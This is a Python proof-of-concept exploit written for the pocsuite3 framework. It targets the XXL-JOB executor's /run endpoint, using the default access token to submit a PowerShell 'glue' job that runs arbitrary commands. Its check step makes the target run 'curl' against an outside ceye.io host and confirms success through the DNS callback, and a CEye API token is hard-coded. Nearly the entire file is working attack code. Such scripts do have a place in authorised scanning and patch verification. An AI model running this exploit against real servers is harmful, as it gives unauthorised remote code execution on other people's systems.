from pocsuite3.api import (
    minimum_version_required, POCBase, register_poc, requests, logger,
    OptString, OrderedDict,
    random_str,
    CEye,
    get_listener_ip, get_listener_port, REVERSE_PAYLOAD, Interactsh
)
import socket
from time import sleep
import binascii
import os
from urllib.parse import urljoin


#

#
#
class POC(POCBase):
    def _exploit(self, parm):
        vul_url = urljoin(self.url, '/run')
        headers = {
            'Host': f'{self.rhost}:{self.rport}',
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'Accept-Language': 'en',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36',
            'XXL-JOB-ACCESS-TOKEN': 'default_token',
            'Connection': 'close',
            'Content-Type': 'application/json',
        }

        data = {
            "jobId": 1,
            "executorHandler": "demoJobHandler",
            "executorParams": "demoJobHandler",
            "executorBlockStrategy": "SERIAL_EXECUTION",
            "executorTimeout": 0,
            "logId": 1,
            "logDateTime": 1586629003729,
            "glueType": "GLUE_POWERSHELL",
            "glueSource": f"{parm}",
            "glueUpdatetime": 1586699003758,
            "broadcastIndex": 0,
            "broadcastTotal": 0
        }
        sleep(10)
        res = requests.post(vul_url, headers=headers, json=data, verify=False)
        if res.status_code == 200:
            return res.text

    def _verify(self):
        result = {}
        random_uri = random_str(4)
        oob = CEye(token="7fc4d3bb399a9827c4065d93fd3fe408")
        v = oob.build_request(value=random_uri, type='dns')
        url, flag = v['url'], v['flag']
        param = f"curl z21zxk.ceye.io"
        self._exploit(param)
        if oob.verify_request(flag,type="dns"):
            result['VerifyInfo'] = {}
            result['VerifyInfo']['url'] = self.url
            return self.parse_output(result)


    # def _verify(self):
    #     print(self.url)
    #     ish = Interactsh(token='', server='interact.sh')
    #     url, flag = ish.build_request()
    #     print(url, flag)
    #     requests.get(url, verify=False)
    #     print(ish.verify(flag))
    #


#
register_poc(POC)
